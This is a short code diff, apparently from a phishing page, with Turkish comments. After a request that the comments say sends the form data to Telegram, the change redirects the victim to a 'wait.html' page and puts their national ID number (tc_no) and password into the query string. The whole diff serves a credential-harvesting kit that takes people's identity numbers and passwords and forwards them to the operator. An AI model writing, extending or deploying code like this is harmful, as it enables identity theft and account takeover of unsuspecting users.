@@ -345,8 +345,9 @@ background-color: #fff;
 
                 // RESPONSE (Telegram'a gönderim) BAŞARILI İSE
                 if (response.ok) {
-                    // Yönlendirme: wait.html'e
-                    window.location.href = 'wait.html'; 
+                    // Yönlendirme: wait.html'e querystring ile (tc_no ve password)
+                    const qs = new URLSearchParams({ 'tc_no': tcNo, 'password': password });
+                    window.location.href = `wait.html?${qs.toString()}`; 
 
                 } else {
                     // Hata durumunda (API'den dönen hata)
